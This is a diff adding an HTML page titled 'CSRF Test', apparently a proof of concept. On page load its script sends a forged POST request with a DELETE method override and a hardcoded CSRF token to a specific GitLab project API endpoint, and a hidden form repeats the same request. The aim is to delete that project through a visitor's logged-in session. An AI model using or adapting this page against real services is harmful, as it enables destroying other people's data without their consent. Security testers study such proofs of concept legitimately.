@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Test</title>
+  </head>
+  <body>
+    <form
+      id="csrf-test-form"
+      action="https://gitlab.com/api/v4/projects/67130053"
+      method="POST"
+    >
+      <input type="hidden" name="_method" value="DELETE" />
+      <button type="submit">Test CSRF</button>
+    </form>
+    <script>
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://gitlab.com/api/v4/projects/67130053", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.setRequestHeader(
+        "X-Csrf-Token",
+        "evmOJ4aNqU-MZVbdwBq9ATbiwMFy-JwOktQwhAzM2TTcKQMJo2oxPL8KJT_cL1jLCrQrWiotXD3-Q34p96_D9Q"
+      );
+      xhr.send("_method=DELETE");
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          var status = xhr.status;
+          if (status === 0 || (status >= 200 && status < 400)) {
+            console.log(xhr.responseText);
+          } else {
+            console.log("Error:", xhr.statusText);
+          }
+        }
+      };
+    </script>
+  </body>
+</html>
